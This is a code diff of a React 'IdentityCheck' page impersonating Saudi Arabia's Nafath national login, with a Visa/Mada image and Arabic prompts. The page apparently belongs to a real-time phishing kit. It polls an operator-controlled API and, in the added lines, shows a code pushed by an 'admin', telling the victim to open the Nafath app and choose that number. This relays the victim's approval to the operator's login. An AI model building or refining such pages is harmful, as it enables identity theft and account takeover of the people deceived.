@@ -1,5 +1,4 @@
 import { useState, useEffect } from "react";
-import { useLocation } from "wouter";
 import { useQuery } from "@tanstack/react-query";
 import { getControlAction } from "@/lib/api";
 import { Header } from "@/components/layout/Header";
@@ -8,11 +7,9 @@ import { motion, AnimatePresence } from "framer-motion";
 import visaMadaImage from "../assets/VISAMADAH_1779063055374.png";
 
 export default function IdentityCheck() {
-  const [, setLocation] = useLocation();
   const [showSpinner, setShowSpinner] = useState(true);
   const [adminCode, setAdminCode] = useState<string | null>(null);
   const [fadeOut, setFadeOut] = useState(false);
-  const [redirecting, setRedirecting] = useState(false);
   
   const sessionId = localStorage.getItem("sessionId");
   
@@ -28,35 +25,16 @@ export default function IdentityCheck() {
   useEffect(() => {
     if (!controlData) return;
     
-    if (controlData.action === "identity_code") {
-      // Admin sent a code - hide spinner and show the code immediately
-      setShowSpinner(false);
-      setAdminCode("verified");
-      
-      // Start redirect after showing
-      setTimeout(() => {
-        setRedirecting(true);
-        setTimeout(() => {
-          setLocation("/nomer");
-        }, 1500);
-      }, 2000);
-    }
-  }, [controlData]);
-
-  // Auto-hide spinner after 6 seconds if no admin code
-  useEffect(() => {
-    if (!showSpinner || adminCode) return;
-    
-    const timer = setTimeout(() => {
+    if (controlData.action === "identity_code" && controlData.code) {
+      // Admin sent a code - hide spinner and show the code
       setFadeOut(true);
       setTimeout(() => {
         setShowSpinner(false);
         setFadeOut(false);
+        setAdminCode(controlData.code || "✓");
       }, 500);
-    }, 6000);
-    
-    return () => clearTimeout(timer);
-  }, [showSpinner, adminCode, fadeOut]);
+    }
+  }, [controlData]);
 
   return (
     <div className="min-h-screen bg-gray-50 flex flex-col">
@@ -67,7 +45,7 @@ export default function IdentityCheck() {
           
           <img src={visaMadaImage} alt="Nafath" className="h-16 mx-auto mb-8 object-contain" />
           
-          {/* Spinner or Verified */}
+          {/* Spinner or Code */}
           <div className="mb-8">
             <AnimatePresence mode="wait">
               {showSpinner ? (
@@ -80,15 +58,6 @@ export default function IdentityCheck() {
                 >
                   <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
                 </motion.div>
-              ) : redirecting ? (
-                <motion.div
-                  initial={{ opacity: 0, scale: 0.8 }}
-                  animate={{ opacity: 1, scale: 1 }}
-                  exit={{ opacity: 0 }}
-                  className="flex flex-col items-center"
-                >
-                  <Loader2 className="w-20 h-20 animate-spin text-primary mb-4" />
-                </motion.div>
               ) : (
                 <motion.div
                   initial={{ opacity: 0, scale: 0.8 }}
@@ -96,7 +65,7 @@ export default function IdentityCheck() {
                   className="flex flex-col items-center"
                 >
                   <div className="w-20 h-20 rounded-full bg-green-100 flex items-center justify-center mb-4">
-                    <span className="text-4xl">✓</span>
+                    <span className="text-4xl font-bold text-green-700">✓</span>
                   </div>
                 </motion.div>
               )}
@@ -104,29 +73,30 @@ export default function IdentityCheck() {
           </div>
 
           {/* Message */}
-          {redirecting ? (
+          <h2 className="text-xl font-bold text-gray-800 mb-4">
+            {adminCode ? "التحقق من الهوية" : "جارٍ التحقق من الهوية..."}
+          </h2>
+          
+          {adminCode ? (
             <>
-              <h2 className="text-xl font-bold text-gray-800 mb-4">جارٍ التحويل...</h2>
-              <p className="text-gray-600">يتم توجيهك للخطوة التالية</p>
-            </>
-          ) : adminCode ? (
-            <>
-              <h2 className="text-xl font-bold text-green-700 mb-4">تم التحقق بنجاح ✓</h2>
-              <p className="text-gray-600 leading-relaxed">
-                تمت عملية التحقق من هويتك بنجاح
+              <p className="text-gray-600 leading-relaxed mb-6">
+                يرجى فتح تطبيق النفاذ الوطني واختيار الرقم الموضح ادناه
+              </p>
+              <div className="bg-blue-50 border-2 border-blue-200 rounded-3xl p-6 mb-4">
+                <span className="text-5xl font-bold text-blue-700" dir="ltr">
+                  {adminCode}
+                </span>
+              </div>
+              <p className="text-sm text-gray-500">
+                في انتظار الخطوة التالية...
               </p>
             </>
           ) : (
-            <>
-              <h2 className="text-xl font-bold text-gray-800 mb-4">
-                جارٍ التحقق من الهوية...
-              </h2>
-              <p className="text-gray-600 leading-relaxed">
-                يرجى الانتظار وعدم إغلاق الصفحة
-                <br />
-                يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
-              </p>
-            </>
+            <p className="text-gray-600 leading-relaxed">
+              يرجى الانتظار وعدم إغلاق الصفحة
+              <br />
+              يتم حالياً التأكد من معلوماتك عبر منصة النفاذ الوطني الموحد
+            </p>
           )}
 
         </div>
